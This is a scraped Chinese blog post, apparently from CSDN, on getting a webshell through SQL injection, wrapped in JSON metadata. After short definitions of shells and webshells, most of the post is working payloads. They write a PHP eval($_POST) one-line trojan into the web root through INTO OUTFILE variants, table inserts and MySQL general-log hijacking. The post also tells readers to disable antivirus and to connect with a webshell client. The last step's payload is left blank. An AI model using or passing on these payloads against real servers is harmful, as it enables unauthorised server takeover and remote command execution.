{"blogid": "122951715", "writerAge": "码龄3年", "writerBlogNum": "29", "writerCollect": "267", "writerComment": "40", "writerFan": "193", "writerGrade": "3级", "writerIntegral": "452", "writerName": "一句话木马", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_122951715.jpg", "writerRankTotal": "83599", "writerRankWeekly": "360443", "writerThumb": "81", "writerVisitNum": "96260", "blog_read_count": "3240", "blog_time": "于 2022-02-15 22:51:51 发布", "blog_title": "SQL注入-getshell", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%E4%B8%80%E3%80%81getshell%E7%9A%84%E5%90%AB%E4%B9%89-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%B8%80%E3%80%81getshell%E7%9A%84%E5%90%AB%E4%B9%89\">一、getshell的含义</a></p>\n<p id=\"1.%E4%BB%80%E4%B9%88%E6%98%AFshell%EF%BC%9F-toc\" style=\"margin-left:40px;\"><a href=\"#1.%E4%BB%80%E4%B9%88%E6%98%AFshell%EF%BC%9F\">1.什么是shell？</a></p>\n<p id=\"2.%E4%BB%80%E4%B9%88%E6%98%AFwebshell%3F-toc\" style=\"margin-left:40px;\"><a href=\"#2.%E4%BB%80%E4%B9%88%E6%98%AFwebshell%3F\">2.什么是webshell?</a></p>\n<p id=\"3.%E4%BB%80%E4%B9%88%E6%98%AFgetshell-toc\" style=\"margin-left:40px;\"><a href=\"#3.%E4%BB%80%E4%B9%88%E6%98%AFgetshell\">3.什么是getshell</a></p>\n<p id=\"%E4%BA%8C%E3%80%81%E5%A4%A7%E9%A9%AC%E5%92%8C%E5%B0%8F%E9%A9%AC%E7%9A%84%E6%AF%94%E8%BE%83-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%BA%8C%E3%80%81%E5%A4%A7%E9%A9%AC%E5%92%8C%E5%B0%8F%E9%A9%AC%E7%9A%84%E6%AF%94%E8%BE%83\">二、大马和小马的比较</a></p>\n<p id=\"%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5getshell-toc\" style=\"margin-left:0px;\"><a href=\"#%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5getshell\">三、SQL注入getshell</a></p>\n<p id=\"1.%E5%86%99%E6%96%87%E4%BB%B6--into%20outfile-toc\" style=\"margin-left:40px;\"><a href=\"#1.%E5%86%99%E6%96%87%E4%BB%B6--into%20outfile\">1.写文件--into outfile</a></p>\n<p id=\"2.union%20select%20getshell-toc\" style=\"margin-left:40px;\"><a href=\"#2.union%20select%20getshell\">2.union select getshell</a></p>\n<p id=\"3.lines%20starting%20getshell-toc\" style=\"margin-left:40px;\"><a href=\"#3.lines%20starting%20getshell\">3.lines starting getshell</a></p>\n<p id=\"4.fields%20terminated%20getshell-toc\" style=\"margin-left:40px;\"><a href=\"#4.fields%20terminated%20getshell\">4.fields terminated getshell</a></p>\n<p id=\"%C2%A05.COLUMNS%20terminated%20getshell-toc\" style=\"margin-left:40px;\"><a href=\"#%C2%A05.COLUMNS%20terminated%20getshell\">5.COLUMNS terminated getshell</a></p>\n<p id=\"6.getshell-%E6%95%B0%E6%8D%AE%E8%A1%A8getshell-toc\" style=\"margin-left:40px;\"><a href=\"#6.getshell-%E6%95%B0%E6%8D%AE%E8%A1%A8getshell\">6.getshell-数据表getshell</a></p>\n<p id=\"7.getshell-%E6%97%A5%E5%BF%97getshell-toc\" style=\"margin-left:40px;\"><a href=\"#7.getshell-%E6%97%A5%E5%BF%97getshell\">7.getshell-日志getshell</a></p>\n<hr id=\"hr-toc\"/>\n<h1 id=\"%E4%B8%80%E3%80%81getshell%E7%9A%84%E5%90%AB%E4%B9%89\">一、getshell的含义</h1>\n<h2 id=\"1.%E4%BB%80%E4%B9%88%E6%98%AFshell%EF%BC%9F\">1.什么是shell？</h2>\n<p>Shell 是一个程序，提供一个用户与操作系统内核连接的环境。这个环境只有一个命令提示符，让用户从键盘输入命令，所以又称为命令行环境。</p>\n<h2 id=\"2.%E4%BB%80%E4%B9%88%E6%98%AFwebshell%3F\">2.什么是webshell?</h2>\n<p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>\n<h2 id=\"3.%E4%BB%80%E4%B9%88%E6%98%AFgetshell\">3.什么是getshell</h2>\n<p>攻击者通过多种漏洞常见如文件上传、SQL注入、命令执行、文件包含、解析漏洞等，将脚本文件上传到Web服务器，并让服务器解析，从而使攻击者能得到一个与服务器进行交互的命令执行环境，进而得以控制服务器。</p>\n<h1 id=\"%E4%BA%8C%E3%80%81%E5%A4%A7%E9%A9%AC%E5%92%8C%E5%B0%8F%E9%A9%AC%E7%9A%84%E6%AF%94%E8%BE%83\">二、大马和小马的比较</h1>\n<table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" style=\"width:500px;\"><tbody><tr><td></td><td>小马（一句话木马）</td><td>大马</td></tr><tr><td>功能</td><td>功能简单，需要配合客户端使用</td><td>功能完善，直接使用浏览器即可利用</td></tr><tr><td>文件大小</td><td>代码量通常在一行左右，不超过10行</td><td>代码量通常较大</td></tr><tr><td>隐蔽性</td><td>强，容易通过变形隐藏特征，绕过过滤</td><td>相对较弱，代码量大，通常需要通过加密等方式来隐藏特征。</td></tr></tbody></table>\n<p></p>\n<h1 id=\"%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5getshell\">三、SQL注入getshell</h1>\n<h2 id=\"1.%E5%86%99%E6%96%87%E4%BB%B6--into%20outfile\">1.写文件--into outfile</h2>\n<p>前提：</p>\n<ol><li>网站的绝对路径</li><li>没有对引号进行过滤</li><li>文件必须有写的权限</li></ol>\n<h2 id=\"2.union%20select%20getshell\">2.union select getshell</h2>\n<p>payload:1' union select 1,'&lt;?php eval(\"$_POST[2]\")?&gt;',3 into outfile 'd:/phpstudy_pro/www/1.php'--+</p>\n<p>注意：需要关闭电脑的病毒检测</p>\n<p>使用c刀连接</p>\n<p><img alt=\"\" height=\"25\" src=\"..\\..\\static\\image\\6cb363f6ce374ff2bfad6d2e2c8f2be3.png\" width=\"878\"/></p>\n<p>2.lines terminated by </p>\n<p>        lines terminated by 该语句是设置每行数据结尾的字符，可以设置为单个或多个字符，默认为“/n”;</p>\n<p>payload: ?id=1' into outfile 'd:/phpstudy_pro/www/2.php'lines terminated by'&lt;?php eval(\"$_POST[8]\")?&gt;'--+3.</p>\n<p><img alt=\"\" height=\"484\" src=\"..\\..\\static\\image\\7d45478b6f844eea9c0c0239d81ced36.png\" width=\"883\"/></p>\n<h2 id=\"3.lines%20starting%20getshell\">3.lines starting getshell</h2>\n<p>lines starting getshell该语句为设置每行开头的字符</p>\n<p>payload：?id=1' into outfile 'd:/phpstudy_pro/www/3.php'lines starting by'&lt;?php eval(\"$_POST[8]\")?&gt;'--+</p>\n<h2 id=\"4.fields%20terminated%20getshell\">4.fields terminated getshell</h2>\n<p>fields terminated by 设置字段之间的分隔符，默认值是\"\\t\"</p>\n<p>payload：?id=1')) into outfile'd:/phpstudy_pro/www/4.php' fields terminated by '&lt;?php eval(\"$_POST[8]\")?&gt;'--+</p>\n<p><img alt=\"\" height=\"248\" src=\"..\\..\\static\\image\\be46baaa0f654637a4ebf5f1f0646f37.png\" width=\"1200\"/></p>\n<h2 id=\"%C2%A05.COLUMNS%20terminated%20getshell\">5.COLUMNS terminated getshell</h2>\n<p>COLUMNS terminated by 设置字段之间的分隔符，默认值是\"\\t\"</p>\n<p>payload：?id=1')) into outfile'd:/phpstudy_pro/www/6.php' COLUMNS terminated by'&lt;?php eval(\"$_POST[4]\")?&gt;'--+</p>\n<p><img alt=\"\" height=\"273\" src=\"..\\..\\static\\image\\3c9eda048abb4d1c80d48c79e0265ff3.png\" width=\"1200\"/></p>\n<h2 id=\"6.getshell-%E6%95%B0%E6%8D%AE%E8%A1%A8getshell\">6.getshell-数据表getshell</h2>\n<p>前提：需要将shell内容插入数据表中，在将表内容写成可执行文件，所以要想利用它getshell，一般数据库有堆叠注入或phpmyadmin或有一个数据库的基本权限才能getshell。</p>\n<p>payload：id=1';insert into users(username,password) values('&lt;?php eval(\"','$_POST[2]\")?&gt;')--+</p>\n<p><img alt=\"\" height=\"69\" src=\"..\\..\\static\\image\\4990a3cfc51245d9bc6bff300516884a.png\" width=\"447\"/></p>\n<h2 id=\"7.getshell-%E6%97%A5%E5%BF%97getshell\">7.getshell-日志getshell</h2>\n<p>7.1 开启全局日志配置</p>\n<p>payload：?id=1';set global general_log = on;--+</p>\n<p>7.2设置日志路径（webshell路径）</p>\n<p>id=1';set global general_log_file = 'd:/phpStudy_pro/WWW/8.php';--+</p>\n<p>7.3写入木马病毒</p>\n<p>id=1';select '&lt;?php eval(\"$_POST[2]\")?&gt;';--+</p>\n<p>payload：</p>\n<p> </p>\n<p></p>\n<p></p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-02-15 22:51:51", "summary": "目录一、的含义什么是？什么是什么是二、大马和小马的比较三、注入写文件数据表日志一、的含义什么是？是一个程序，提供一个用户与操作系统内核连接的环境。这个环境只有一个命令提示符，让用户从键盘输入命令，所以"}